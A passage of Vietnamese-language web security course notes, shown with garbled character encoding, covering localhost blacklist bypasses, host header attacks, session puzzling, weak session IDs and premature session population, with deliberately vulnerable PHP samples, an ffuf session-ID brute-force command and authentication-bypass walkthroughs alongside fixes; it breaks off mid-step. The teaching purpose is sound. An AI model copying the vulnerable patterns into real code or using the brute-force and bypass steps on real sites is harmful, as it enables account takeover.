- **IPv4 address trong IPv6 format**: `[0:0:0:0:0:ffff:127.0.0.1]`
- **TÃªn miá»n bÃªn ngoÃ i** mÃ  trá» vá» `localhost`: `localtest.me`

VÃ­ dá»¥, ta cÃ³ thá»ƒ kiá»ƒm tra mÃ£ hex `0x7f000001` báº±ng cÃ¡ch sá»­ dá»¥ng lá»‡nh **ping** Ä‘á»ƒ xÃ¡c nháº­n ráº±ng nÃ³ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i `127.0.0.1`:

```
ping 0x7f000001 -c 1
PING 0x7f000001 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
```

Náº¿u á»©ng dá»¥ng web chá»‰ kiá»ƒm tra cÃ¡c giÃ¡ trá»‹ cá»¥ thá»ƒ trong danh sÃ¡ch Ä‘en mÃ  khÃ´ng tÃ­nh Ä‘áº¿n cÃ¡c cÃ¡ch mÃ£ hÃ³a khÃ¡c, káº» táº¥n cÃ´ng cÃ³ thá»ƒ dá»… dÃ ng vÆ°á»£t qua blacklist vÃ  tiáº¿p tá»¥c thá»±c hiá»‡n táº¥n cÃ´ng.

---
# 13.NgÄƒn Ngá»«a Táº¥n CÃ´ng Host Header

Sau khi tÃ¬m hiá»ƒu cÃ¡c cÃ¡ch nháº­n dáº¡ng vÃ  khai thÃ¡c lá»— há»•ng **host header**, dÆ°á»›i Ä‘Ã¢y lÃ  cÃ¡c phÆ°Æ¡ng phÃ¡p báº£o vá»‡ á»©ng dá»¥ng web khá»i cÃ¡c táº¥n cÃ´ng nÃ y. Pháº§n lá»›n cÃ¡c lá»— há»•ng liÃªn quan Ä‘áº¿n **host header** xuáº¥t phÃ¡t tá»« viá»‡c xá»­ lÃ½ khÃ´ng Ä‘Ãºng cÃ¡ch hoáº·c kiá»ƒm tra khÃ´ng Ä‘áº§y Ä‘á»§. ChÃºng ta sáº½ phÃ¢n tÃ­ch cÃ¡c vÃ­ dá»¥ mÃ£ hÃ³a dá»… bá»‹ tá»•n thÆ°Æ¡ng vÃ  cÃ¡ch kháº¯c phá»¥c.

---

#### **1. Cáº¥u HÃ¬nh KhÃ´ng An ToÃ n**

##### **Tin TÆ°á»Ÿng MÃ¹ QuÃ¡ng vÃ o Host Header**

Má»™t sá»‘ á»©ng dá»¥ng web dá»±a vÃ o **host header** mÃ  khÃ´ng nháº­n thá»©c ráº±ng nÃ³ cÃ³ thá»ƒ bá»‹ thay Ä‘á»•i. VÃ­ dá»¥:

```php
$headers = getallheaders();
$host_header = $headers['Host'];
if (is_local_request($host_header)) {
    echo "Welcome Admin!";
} else {
    echo "Unauthorized! The admin area can only be accessed locally!";
    die();
}
```

**Lá»— há»•ng:**  
HÃ m `is_local_request()` chá»‰ kiá»ƒm tra **host header** vá»›i má»™t danh sÃ¡ch giÃ¡ trá»‹ tin cáº­y. Káº» táº¥n cÃ´ng cÃ³ thá»ƒ giáº£ máº¡o **host header** Ä‘á»ƒ qua máº·t cÆ¡ cháº¿ xÃ¡c thá»±c.

**Kháº¯c phá»¥c:**  
- KhÃ´ng sá»­ dá»¥ng **host header** lÃ m nguá»“n xÃ¡c thá»±c.
- Dá»±a vÃ o Ä‘á»‹a chá»‰ IP tá»« `$_SERVER['REMOTE_ADDR']` náº¿u cáº§n kiá»ƒm tra nguá»“n yÃªu cáº§u.
- Triá»ƒn khai cÆ¡ cháº¿ xÃ¡c thá»±c an toÃ n nhÆ° máº­t kháº©u máº¡nh hoáº·c xÃ¡c thá»±c hai yáº¿u tá»‘ (2FA).
- Háº¡n cháº¿ truy cáº­p tá»« bÃªn ngoÃ i báº±ng tÆ°á»ng lá»­a hoáº·c VPN.

---

#### **2. Kiá»ƒm Tra Host Header KhÃ´ng ÄÃºng CÃ¡ch**

##### **VÃ­ dá»¥: Lá»— Há»•ng Password Reset Poisoning**

```php
function check_host($host_header) {
    return str_ends_with($host_header, get_config_value('domain'));
}

function create_reset_link($user, $host_header) {
    $token = generate_reset_token($user);
    if (check_host($host_header)) {
        return "http://" . $host_header . "/pw_reset.php?token=" . $token;
    }
    return "http://" . get_config_value('domain') . "/pw_reset.php?token=" . $token;
}
```

**Lá»— há»•ng:**  
- Kiá»ƒm tra `str_ends_with` khÃ´ng Ä‘á»§ an toÃ n, cho phÃ©p káº» táº¥n cÃ´ng sá»­ dá»¥ng tÃªn miá»n nhÆ° `evilvulndomain.htb` (cÃ³ Ä‘uÃ´i tÆ°Æ¡ng tá»± nhÆ° tÃªn miá»n há»£p lá»‡).

**Kháº¯c phá»¥c:**  
Thay tháº¿ viá»‡c sá»­ dá»¥ng **host header** báº±ng cÃ¡ch láº¥y giÃ¡ trá»‹ tÃªn miá»n tá»« tá»‡p cáº¥u hÃ¬nh:

```php
function create_reset_link($user) {
    $token = generate_reset_token($user);
    return "http://" . get_config_value('domain') . "/pw_reset.php?token=" . $token;
}
```

---

#### **3. Lá»i KhuyÃªn Tá»•ng QuÃ¡t**

1. **Sá»­ dá»¥ng URL tÆ°Æ¡ng Ä‘á»‘i khi cÃ³ thá»ƒ:**  
   URL tÆ°Æ¡ng Ä‘á»‘i khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng bá»Ÿi cÃ¡c táº¥n cÃ´ng liÃªn quan Ä‘áº¿n **host header**.

2. **Sá»­ dá»¥ng URL tuyá»‡t Ä‘á»‘i cáº©n tháº­n:**  
   Khi cáº§n URL tuyá»‡t Ä‘á»‘i (vÃ­ dá»¥ trong email khÃ´i phá»¥c máº­t kháº©u), luÃ´n sá»­ dá»¥ng giÃ¡ trá»‹ tÃªn miá»n Ä‘Æ°á»£c cáº¥u hÃ¬nh bá»Ÿi quáº£n trá»‹ viÃªn.

3. **KhÃ´ng há»— trá»£ cÃ¡c override headers:**  
   Cáº¥u hÃ¬nh mÃ¡y chá»§ web Ä‘á»ƒ vÃ´ hiá»‡u hÃ³a cÃ¡c tiÃªu Ä‘á» nhÆ° `X-Forwarded-Host` nháº±m giáº£m thiá»ƒu táº¥n cÃ´ng **host header**.

4. **Kháº¯c phá»¥c ngay cáº£ khi lá»— há»•ng cÃ³ váº» khÃ´ng khai thÃ¡c Ä‘Æ°á»£c:**  
   VÃ­ dá»¥:

   ```php
   $headers = getallheaders();
   $host_header = $headers['Host'];
   ?>
   <script src="http://<?php echo $host_header ?>/test.js"></script>
   ```

   Lá»— há»•ng XSS pháº£n chiáº¿u cÃ³ thá»ƒ bá»‹ khai thÃ¡c náº¿u káº¿t há»£p vá»›i **web cache poisoning** hoáº·c cÃ¡c override headers.

5. **KhÃ´ng dá»±a vÃ o cáº¥u hÃ¬nh há»‡ thá»‘ng trung gian:**  
   CÃ¡c proxy hoáº·c tÆ°á»ng lá»­a cÃ³ thá»ƒ cháº·n yÃªu cáº§u vá»›i **host header** bá»‹ thao tÃºng, nhÆ°ng á»©ng dá»¥ng web khÃ´ng nÃªn dá»±a vÃ o Ä‘iá»u nÃ y Ä‘á»ƒ tá»± báº£o vá»‡.

---
# 14. Giá»›i Thiá»‡u vá» Lá»— Há»•ng Session Puzzling

**Session puzzling** lÃ  má»™t lá»— há»•ng phÃ¡t sinh do cÃ¡ch xá»­ lÃ½ khÃ´ng Ä‘Ãºng cá»§a cÃ¡c biáº¿n phiÃªn (session variables) trong á»©ng dá»¥ng web. Má»©c Ä‘á»™ nghiÃªm trá»ng cá»§a lá»— há»•ng nÃ y phá»¥ thuá»™c vÃ o cÃ¡ch á»©ng dá»¥ng triá»ƒn khai vÃ  cÃ¡ch sá»­ dá»¥ng cÃ¡c biáº¿n phiÃªn.

---

### **1. Táº§m Quan Trá»ng cá»§a Session trong HTTP**

**HTTP lÃ  má»™t giao thá»©c khÃ´ng tráº¡ng thÃ¡i (stateless protocol):**  
Má»—i yÃªu cáº§u HTTP Ä‘Æ°á»£c xá»­ lÃ½ Ä‘á»™c láº­p, khÃ´ng cÃ³ ngá»¯ cáº£nh vá»›i cÃ¡c yÃªu cáº§u trÆ°á»›c hoáº·c sau. Äá»ƒ cung cáº¥p ngá»¯ cáº£nh giá»¯a cÃ¡c yÃªu cáº§u (vÃ­ dá»¥: giá» hÃ ng, xÃ¡c thá»±c ngÆ°á»i dÃ¹ng), cÃ¡c biáº¿n phiÃªn, token phiÃªn (session tokens), hoáº·c cookie phiÃªn (session cookies) Ä‘Æ°á»£c sá»­ dá»¥ng.

#### **So sÃ¡nh Stateful vÃ  Stateless Session Tokens**

1. **Stateful Session Tokens:**
   - Server lÆ°u trá»¯ thÃ´ng tin phiÃªn (vÃ­ dá»¥: ID ngÆ°á»i dÃ¹ng) liÃªn quan Ä‘áº¿n token trÃªn mÃ¡y chá»§.
   - VÃ­ dá»¥: 
     ```php
     Set-Cookie: PHPSESSID=hvplcmsh88ja77r3dutanmn68u;
     ```
   - Dá»¯ liá»‡u phiÃªn cÃ³ thá»ƒ Ä‘Æ°á»£c lÆ°u trong file trÃªn server:
     ```bash
     cat /var/lib/php/sessions/sess_hvplcmsh88ja77r3dutanmn68u
     Username|s:8:"testuser";Active|b:1;
     ```

2. **Stateless Session Tokens:**
   - Dá»¯ liá»‡u cáº§n thiáº¿t Ä‘Æ°á»£c mÃ£ hÃ³a vÃ  lÆ°u trong token.
   - VÃ­ dá»¥ phá»• biáº¿n: **JSON Web Tokens (JWTs):**
     ```text
     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwi...
     ```

---

### **2. Lá»— Há»•ng Session Puzzling**

#### **MÃ´ táº£ lá»— há»•ng:**

Session puzzling xáº£y ra khi á»©ng dá»¥ng xá»­ lÃ½ cÃ¡c biáº¿n phiÃªn khÃ´ng Ä‘Ãºng cÃ¡ch, dáº«n Ä‘áº¿n viá»‡c má»™t giÃ¡ trá»‹ máº·c Ä‘á»‹nh khÃ´ng an toÃ n hoáº·c thao tÃ¡c khÃ´ng mong muá»‘n vá»›i cÃ¡c biáº¿n phiÃªn. VÃ­ dá»¥:

```php
<?php
require_once('db.php');
session_start();

// ÄÄƒng nháº­p
if (check_password($_POST['username'], $_POST['password'])) {
    $_SESSION['user_id'] = get_user_id($_POST['username']);
    header("Location: profile.php");
    die();
} else {
    echo "Unauthorized";
}

// ÄÄƒng xuáº¥t
if (isset($_POST['logout'])) {
    $_SESSION['user_id'] = 0;
}
?>
```

**Ká»‹ch báº£n táº¥n cÃ´ng:**
- Khi Ä‘Äƒng nháº­p, server lÆ°u `user_id` vÃ o session. 
- Khi Ä‘Äƒng xuáº¥t, `user_id` Ä‘Æ°á»£c Ä‘áº·t thÃ nh `0` nhÆ°ng session khÃ´ng bá»‹ há»§y.
- Náº¿u `0` lÃ  má»™t giÃ¡ trá»‹ há»£p lá»‡ (vÃ­ dá»¥: ID cá»§a admin), káº» táº¥n cÃ´ng cÃ³ thá»ƒ:
  1. ÄÄƒng nháº­p vÃ o tÃ i khoáº£n cá»§a mÃ¬nh.
  2. ÄÄƒng xuáº¥t Ä‘á»ƒ Ä‘áº·t `user_id` thÃ nh `0`.
  3. Truy cáº­p trang `/profile.php` Ä‘á»ƒ phÃ¡t hiá»‡n ráº±ng mÃ¬nh Ä‘ang Ä‘Äƒng nháº­p vá»›i vai trÃ² admin.

---

### **3. Giáº£i PhÃ¡p NgÄƒn Ngá»«a**

Äá»ƒ trÃ¡nh lá»— há»•ng session puzzling, cáº§n tuÃ¢n thá»§ cÃ¡c nguyÃªn táº¯c sau:

1. **Há»§y Session Sau Khi ÄÄƒng Xuáº¥t:**
   - KhÃ´ng chá»‰ Ä‘áº·t láº¡i cÃ¡c giÃ¡ trá»‹ biáº¿n phiÃªn, mÃ  cáº§n há»§y hoÃ n toÃ n phiÃªn:
     ```php
     if (isset($_POST['logout'])) {
         session_destroy();
     }
     ```

2. **Sá»­ Dá»¥ng GiÃ¡ Trá»‹ Máº·c Äá»‹nh An ToÃ n:**
   - TrÃ¡nh sá»­ dá»¥ng cÃ¡c giÃ¡ trá»‹ máº·c Ä‘á»‹nh khÃ´ng an toÃ n. VÃ­ dá»¥: khÃ´ng nÃªn sá»­ dá»¥ng `0` lÃ m ID admin.

3. **XÃ¡c Thá»±c Cháº·t Cháº½ Tráº¡ng ThÃ¡i NgÆ°á»i DÃ¹ng:**
   - Kiá»ƒm tra rÃµ rÃ ng tráº¡ng thÃ¡i xÃ¡c thá»±c trÆ°á»›c khi cho phÃ©p truy cáº­p:
     ```php
     if (!isset($_SESSION['user_id']) || $_SESSION['user_id'] <= 0) {
         die("Unauthorized access");
     }
     ```

4. **MÃ£ HÃ³a vÃ  KÃ½ Token (Stateless Sessions):**
   - Náº¿u sá»­ dá»¥ng JWT hoáº·c cÃ¡c token khÃ´ng tráº¡ng thÃ¡i, cáº§n Ã¡p dá»¥ng mÃ£ hÃ³a máº¡nh vÃ  chá»¯ kÃ½ Ä‘á»ƒ ngÄƒn viá»‡c thao tÃºng.

5. **ThÆ°á»ng XuyÃªn Kiá»ƒm Tra Lá»— Há»•ng:**
   - Thá»±c hiá»‡n kiá»ƒm tra báº£o máº­t Ä‘á»ƒ phÃ¡t hiá»‡n cÃ¡c váº¥n Ä‘á» liÃªn quan Ä‘áº¿n phiÃªn.

---
# 15. Lá»— Há»•ng Weak Session IDs

Session IDs Ä‘Ã³ng vai trÃ² quan trá»ng trong viá»‡c quáº£n lÃ½ phiÃªn (session) cá»§a ngÆ°á»i dÃ¹ng. Tuy nhiÃªn, náº¿u cÃ¡c Session ID khÃ´ng Ä‘á»§ máº¡nh, chÃºng cÃ³ thá»ƒ bá»‹ táº¥n cÃ´ng vÃ  dáº«n Ä‘áº¿n viá»‡c chiáº¿m Ä‘oáº¡t tÃ i khoáº£n thÃ´ng qua cÃ¡c ká»¹ thuáº­t brute-force hoáº·c dá»± Ä‘oÃ¡n. Hai yáº¿u tá»‘ chÃ­nh Ä‘á»ƒ Ä‘áº£m báº£o Ä‘á»™ an toÃ n cá»§a Session ID lÃ  **Ä‘á»™ dÃ i** vÃ  **Ä‘á»™ ngáº«u nhiÃªn (randomness)**.

---

### **1. Short Session IDs (Session ID Ngáº¯n)**

#### **MÃ´ táº£ váº¥n Ä‘á»:**
Session IDs khÃ´ng Ä‘á»§ dÃ i sáº½ dá»… bá»‹ táº¥n cÃ´ng brute-force, Ä‘áº·c biá»‡t náº¿u khÃ´ng Ä‘áº£m báº£o tÃ­nh ngáº«u nhiÃªn. Theo OWASP, má»™t Session ID an toÃ n cáº§n:
- Äá»™ dÃ i tá»‘i thiá»ƒu **16 byte**.
- KhÃ´ng cÃ³ cÃ¡c pháº§n tá»­ cá»‘ Ä‘á»‹nh hoáº·c dá»± Ä‘oÃ¡n Ä‘Æ°á»£c.

VÃ­ dá»¥: Má»™t á»©ng dá»¥ng web sá»­ dá»¥ng Session ID chá»‰ dÃ i **4 kÃ½ tá»±**, káº¿t há»£p chá»¯ cÃ¡i thÆ°á»ng vÃ  sá»‘. Äiá»u nÃ y lÃ m cho khÃ´ng gian giÃ¡ trá»‹ cá»§a Session ID ráº¥t nhá» vÃ  cÃ³ thá»ƒ brute-force má»™t cÃ¡ch nhanh chÃ³ng.

#### **Ká»¹ thuáº­t brute-force thá»±c táº¿:**

1. **Táº¡o danh sÃ¡ch cÃ¡c Session ID kháº£ thi:**
   Sá»­ dá»¥ng cÃ´ng cá»¥ `crunch` Ä‘á»ƒ táº¡o wordlist:
   ```bash
   sudo apt install crunch
   crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o wordlist.txt
   ```

2. **Táº¥n cÃ´ng brute-force báº±ng ffuf:**
   Sá»­ dá»¥ng `ffuf` Ä‘á»ƒ thá»­ táº¥t cáº£ cÃ¡c Session ID:
   ```bash
   ffuf -u http://127.0.0.1/profile.php -b 'sessionID=FUZZ' -w wordlist.txt -fc 302 -t 10
   ```

3. **Káº¿t quáº£:**
   Náº¿u tÃ¬m tháº¥y má»™t Session ID há»£p lá»‡, báº¡n cÃ³ thá»ƒ chiáº¿m Ä‘oáº¡t phiÃªn cá»§a ngÆ°á»i dÃ¹ng khÃ¡c, bao gá»“m cáº£ tÃ i khoáº£n admin.

#### **Biá»‡n phÃ¡p phÃ²ng chá»‘ng:**
- Äáº£m báº£o Session ID cÃ³ Ä‘á»™ dÃ i **tá»‘i thiá»ƒu 16 byte**.
- KhÃ´ng sá»­ dá»¥ng cÃ¡c pháº§n tá»­ cá»‘ Ä‘á»‹nh hoáº·c cÃ³ thá»ƒ Ä‘oÃ¡n trÆ°á»›c trong Session ID.

---

### **2. Insufficient Randomness in Session IDs (Thiáº¿u TÃ­nh Ngáº«u NhiÃªn)**

#### **MÃ´ táº£ váº¥n Ä‘á»:**
Ngay cáº£ khi Session ID Ä‘á»§ dÃ i, nhÆ°ng náº¿u khÃ´ng Ä‘á»§ ngáº«u nhiÃªn hoáº·c cÃ³ cÃ¡c máº«u dá»… dá»± Ä‘oÃ¡n, nÃ³ váº«n cÃ³ thá»ƒ bá»‹ brute-force. TÃ­nh ngáº«u nhiÃªn Ä‘Æ°á»£c Ä‘o lÆ°á»ng thÃ´ng qua **entropy**, vÃ  theo OWASP, Session ID cáº§n cung cáº¥p Ã­t nháº¥t **64 bits entropy** Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n.

VÃ­ dá»¥: Má»™t Session ID dÃ i nhÆ°ng cÃ³ máº«u cá»‘ Ä‘á»‹nh trong má»™t sá»‘ vá»‹ trÃ­ kÃ½ tá»±, dáº«n Ä‘áº¿n giáº£m hiá»‡u quáº£ ngáº«u nhiÃªn.

#### **Kiá»ƒm tra tÃ­nh ngáº«u nhiÃªn báº±ng Burp Suite:**

1. **Thu tháº­p Session ID:**
   - Sá»­ dá»¥ng Burp Suite Ä‘á»ƒ gá»­i nhiá»u yÃªu cáº§u Ä‘Äƒng nháº­p vÃ  thu tháº­p Session IDs.
   - Trong Burp, nháº¥n chuá»™t pháº£i vÃ o yÃªu cáº§u Ä‘Äƒng nháº­p vÃ  chá»n **Send to Sequencer**.

2. **PhÃ¢n tÃ­ch entropy:**
   - Chuyá»ƒn Ä‘áº¿n tab **Sequencer** vÃ  báº¯t Ä‘áº§u **Live Capture** Ä‘á»ƒ thu tháº­p Ã­t nháº¥t 1000 Session IDs.
   - Nháº¥n **Analyze Now** Ä‘á»ƒ phÃ¢n tÃ­ch entropy.

3. **Káº¿t quáº£:**
   - Burp sáº½ Ä‘Æ°a ra Ä‘Ã¡nh giÃ¡ entropy. Náº¿u entropy tháº¥p (vÃ­ dá»¥: **14 bits** thay vÃ¬ 64 bits), Session ID khÃ´ng an toÃ n vÃ  dá»… bá»‹ brute-force.
   - PhÃ¢n tÃ­ch vá»‹ trÃ­ kÃ½ tá»± cho tháº¥y má»™t sá»‘ kÃ½ tá»± cá»‘ Ä‘á»‹nh khÃ´ng Ä‘Ã³ng gÃ³p vÃ o entropy, lÃ m giáº£m tÃ­nh ngáº«u nhiÃªn tá»•ng thá»ƒ.

#### **Biá»‡n phÃ¡p phÃ²ng chá»‘ng:**
- Äáº£m báº£o Session ID cÃ³ tÃ­nh ngáº«u nhiÃªn Ä‘á»§ máº¡nh, cung cáº¥p tá»‘i thiá»ƒu **64 bits entropy**.
- Sá»­ dá»¥ng cÃ¡c thuáº­t toÃ¡n táº¡o Session ID ngáº«u nhiÃªn máº¡nh nhÆ° `openssl_random_pseudo_bytes()` trong PHP hoáº·c `SecureRandom` trong Java.

---
# 16. Common Session Variables vÃ  Lá»— Há»•ng Authentication Bypass

**Session Puzzling Vulnerability** xuáº¥t hiá»‡n khi cÃ¡c biáº¿n phiÃªn (**session variables**) Ä‘Æ°á»£c sá»­ dá»¥ng khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘áº·c biá»‡t khi chÃºng Ä‘Æ°á»£c dÃ¹ng chung cho nhiá»u má»¥c Ä‘Ã­ch trÃªn server. Äiá»u nÃ y cÃ³ thá»ƒ dáº«n Ä‘áº¿n cÃ¡c lá»— há»•ng nghiÃªm trá»ng, cháº³ng háº¡n nhÆ° **bypass authentication**.

---

### **1. PhÃ¡t Hiá»‡n Lá»— Há»•ng**

#### **Tá»•ng quan vá» á»©ng dá»¥ng web:**
á»¨ng dá»¥ng cung cáº¥p:
- **Chá»©c nÄƒng Ä‘Äƒng nháº­p:** Hiá»ƒn thá»‹ thÃ´ng tin ngÆ°á»i dÃ¹ng sau khi Ä‘Äƒng nháº­p.
- **Chá»©c nÄƒng quÃªn máº­t kháº©u:** YÃªu cáº§u tráº£ lá»i cÃ¢u há»i báº£o máº­t Ä‘á»ƒ Ä‘áº·t láº¡i máº­t kháº©u.

Khi thá»±c hiá»‡n quÃªn máº­t kháº©u:
1. NgÆ°á»i dÃ¹ng nháº­p **username**.
2. Tráº£ lá»i cÃ¢u há»i báº£o máº­t.
3. Äáº·t máº­t kháº©u má»›i.

#### **PhÃ¢n tÃ­ch lÆ°u lÆ°á»£ng máº¡ng:**
- Dá»¯ liá»‡u tá»« cÃ¡c bÆ°á»›c quÃªn máº­t kháº©u Ä‘Æ°á»£c truyá»n qua nhiá»u yÃªu cáº§u HTTP liÃªn tiáº¿p.
- CÃ¡c thÃ´ng tin (nhÆ° username) khÃ´ng Ä‘Æ°á»£c gá»­i láº¡i trong tá»«ng yÃªu cáº§u, tá»©c lÃ  **biáº¿n phiÃªn (session variables)** Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÆ°u trá»¯ tráº¡ng thÃ¡i cá»§a ngÆ°á»i dÃ¹ng.

VÃ­ dá»¥:
- Gá»­i yÃªu cáº§u Ä‘áº¿n `/reset_1.php` vá»›i `username=admin` lÆ°u thÃ´ng tin ngÆ°á»i dÃ¹ng vÃ o biáº¿n phiÃªn.
- Náº¿u khÃ´ng cÃ³ cookie phiÃªn, á»©ng dá»¥ng táº¡o má»™t phiÃªn má»›i vÃ  yÃªu cáº§u Ä‘Äƒng nháº­p láº¡i.

---

### **2. Khai ThÃ¡c Lá»— Há»•ng**

#### **TÃ¬m kiáº¿m lá»— há»•ng:**
á»¨ng dá»¥ng sá»­ dá»¥ng cÃ¹ng má»™t biáº¿n phiÃªn (**session variable**) cho:
- QuÃ¡ trÃ¬nh quÃªn máº­t kháº©u.
- Kiá»ƒm tra tráº¡ng thÃ¡i Ä‘Äƒng nháº­p.

#### **Khai thÃ¡c bÆ°á»›c Ä‘áº§u:**
- Gá»­i yÃªu cáº§u Ä‘áº¿n `/reset_1.php` vá»›i `username=admin`.
- Sau Ä‘Ã³, thá»­ truy cáº­p trá»±c tiáº¿p `/reset_3.php` (bÆ°á»›c Ä‘áº·t láº¡i máº­t kháº©u), nhÆ°ng bá»‹ yÃªu cáº§u hoÃ n táº¥t bÆ°á»›c tráº£ lá»i cÃ¢u há»i báº£o máº­t trÆ°á»›c.

#### **Khai thÃ¡c bypass authentication:**
1. Truy cáº­p chá»©c nÄƒng **Forgot Password** vÃ  nháº­p `username=admin`.
2. Truy cáº­p trá»±c tiáº¿p **profile.php** (trang chá»‰ truy cáº­p Ä‘Æ°á»£c khi Ä‘Ã£ Ä‘Äƒng nháº­p).
3. Há»‡ thá»‘ng nháº­n diá»‡n ráº±ng ngÆ°á»i dÃ¹ng Ä‘Ã£ Ä‘Äƒng nháº­p dÆ°á»›i quyá»n `admin`, do sá»­ dá»¥ng chung biáº¿n phiÃªn `Username` cho quÃ¡ trÃ¬nh quÃªn máº­t kháº©u vÃ  Ä‘Äƒng nháº­p.

---

### **3. NguyÃªn NhÃ¢n Cá»§a Lá»— Há»•ng**

Lá»— há»•ng xáº£y ra do backend sá»­ dá»¥ng **biáº¿n phiÃªn chung (`$_SESSION['Username']`)** Ä‘á»ƒ:
- LÆ°u tráº¡ng thÃ¡i trong quÃ¡ trÃ¬nh quÃªn máº­t kháº©u.
- Kiá»ƒm tra xem ngÆ°á»i dÃ¹ng Ä‘Ã£ Ä‘Äƒng nháº­p hay chÆ°a.

#### **MÃ£ PHP Ä‘Æ¡n giáº£n hÃ³a:**

- **Trong reset_1.php** (bÆ°á»›c 1 cá»§a quÃªn máº­t kháº©u):
```php
if (isset($_POST['Submit'])) {
    $_SESSION['Username'] = $_POST['Username']; // LÆ°u username vÃ o biáº¿n phiÃªn
    header("Location: reset_2.php");
    exit;
}
```

- **Trong profile.php** (kiá»ƒm tra tráº¡ng thÃ¡i Ä‘Äƒng nháº­p):
```php
if (!isset($_SESSION['Username'])) { // Chá»‰ kiá»ƒm tra xem biáº¿n Username cÃ³ tá»“n táº¡i hay khÃ´ng
    header("Location: login.php");
    exit;
}
```

=> Cáº£ hai chá»©c nÄƒng Ä‘á»u sá»­ dá»¥ng chung biáº¿n `$_SESSION['Username']`.

---

### **4. Biá»‡n PhÃ¡p PhÃ²ng Chá»‘ng**

1. **TÃ¡ch biá»‡t session variables:**
   - Sá»­ dá»¥ng cÃ¡c biáº¿n khÃ¡c nhau cho cÃ¡c má»¥c Ä‘Ã­ch khÃ¡c nhau.
   - VÃ­ dá»¥:
     ```php
     // Trong reset_1.php
     $_SESSION['ResetUsername'] = $_POST['Username']; // LÆ°u username quÃªn máº­t kháº©u
     ```

2. **Kiá»ƒm tra xÃ¡c thá»±c Ä‘Ãºng cÃ¡ch:**
   - KhÃ´ng chá»‰ kiá»ƒm tra sá»± tá»“n táº¡i cá»§a biáº¿n phiÃªn, mÃ  cáº§n kiá»ƒm tra thÃªm tráº¡ng thÃ¡i Ä‘Äƒng nháº­p thá»±c sá»±.
   - VÃ­ dá»¥:
     ```php
     if (!isset($_SESSION['LoggedIn']) || $_SESSION['LoggedIn'] !== true) {
         header("Location: login.php");
         exit;
     }
     ```

3. **XÃ³a session variables sau khi sá»­ dá»¥ng:**
   - Äáº£m báº£o cÃ¡c biáº¿n liÃªn quan Ä‘áº¿n quÃªn máº­t kháº©u Ä‘Æ°á»£c xÃ³a sau khi hoÃ n thÃ nh quÃ¡ trÃ¬nh.
   - VÃ­ dá»¥:
     ```php
     unset($_SESSION['ResetUsername']);
     ```

4. **Sá»­ dá»¥ng token báº£o máº­t:**
   - Táº¡o vÃ  lÆ°u trá»¯ cÃ¡c token riÃªng cho tá»«ng chá»©c nÄƒng.
   - VÃ­ dá»¥: Token cho quÃ¡ trÃ¬nh quÃªn máº­t kháº©u cÃ³ thá»ƒ Ä‘Æ°á»£c gá»­i qua email vÃ  lÆ°u trá»¯ táº¡m thá»i trÃªn server.

---
# 17. Premature Session Population vÃ  Lá»— Há»•ng Authentication Bypass

Lá»— há»•ng **Premature Session Population** xáº£y ra khi cÃ¡c biáº¿n phiÃªn (**session variables**) Ä‘Æ°á»£c gÃ¡n giÃ¡ trá»‹ trÆ°á»›c khi má»™t quy trÃ¬nh (nhÆ° xÃ¡c thá»±c) hoÃ n táº¥t. Náº¿u khÃ´ng xá»­ lÃ½ hoáº·c xÃ³a bá» biáº¿n phiÃªn ká»‹p thá»i, Ä‘iá»u nÃ y cÃ³ thá»ƒ dáº«n Ä‘áº¿n cÃ¡c váº¥n Ä‘á» báº£o máº­t nghiÃªm trá»ng nhÆ° **bypass authentication**.

---

### **1. PhÃ¡t Hiá»‡n Lá»— Há»•ng**

#### **PhÃ¢n tÃ­ch quy trÃ¬nh Ä‘Äƒng nháº­p:**
- Sau khi **Ä‘Äƒng nháº­p thÃ nh cÃ´ng**, ngÆ°á»i dÃ¹ng Ä‘Æ°á»£c chuyá»ƒn hÆ°á»›ng Ä‘áº¿n `/profile.php`, nÆ¡i hiá»ƒn thá»‹ thÃ´ng tin tÃ i khoáº£n.
- Khi **Ä‘Äƒng nháº­p tháº¥t báº¡i**, ngÆ°á»i dÃ¹ng Ä‘Æ°á»£c chuyá»ƒn hÆ°á»›ng Ä‘áº¿n `/login.php?failed=1`, kÃ¨m theo thÃ´ng bÃ¡o lá»—i.

#### **Quan sÃ¡t lÆ°u lÆ°á»£ng máº¡ng:**
- Trong trÆ°á»ng há»£p tháº¥t báº¡i, á»©ng dá»¥ng hiá»ƒn thá»‹ thÃ´ng bÃ¡o lá»—i kÃ¨m theo **username** cá»§a ngÆ°á»i dÃ¹ng.
- Äiá»u nÃ y cho tháº¥y:
  - **Username** Ä‘Ã£ Ä‘Æ°á»£c lÆ°u trá»¯ trong **session variables**, ngay cáº£ khi quy trÃ¬nh Ä‘Äƒng nháº­p chÆ°a hoÃ n táº¥t.
  - Kiá»ƒm tra thÃªm báº±ng cÃ¡ch gá»­i yÃªu cáº§u Ä‘áº¿n `/login.php?failed=1` mÃ  khÃ´ng cÃ³ cookie phiÃªn cho tháº¥y thÃ´ng bÃ¡o lá»—i khÃ´ng cÃ²n chá»©a **username** â‡’ XÃ¡c nháº­n ráº±ng **session variables** Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÆ°u **username**.

---

### **2. Khai ThÃ¡c Lá»— Há»•ng**

#### **PhÃ¡t hiá»‡n Ä‘iá»ƒm yáº¿u:**
1. **Session variables Ä‘Æ°á»£c gÃ¡n trÆ°á»›c khi kiá»ƒm tra máº­t kháº©u.**
   - Khi Ä‘Äƒng nháº­p tháº¥t báº¡i, server váº«n lÆ°u **username** vÃ o phiÃªn.
2. **Biáº¿n phiÃªn chá»‰ bá»‹ xÃ³a khi redirect Ä‘áº¿n `/login.php?failed=1`.**
   - Náº¿u redirect nÃ y bá»‹ há»§y bá»Ÿi káº» táº¥n cÃ´ng, biáº¿n phiÃªn sáº½ khÃ´ng bá»‹ xÃ³a.

#### **Khai thÃ¡c:**
1. Gá»­i yÃªu cáº§u Ä‘Äƒng nháº­p vá»›i thÃ´ng tin sai cho ngÆ°á»i dÃ¹ng **admin**.
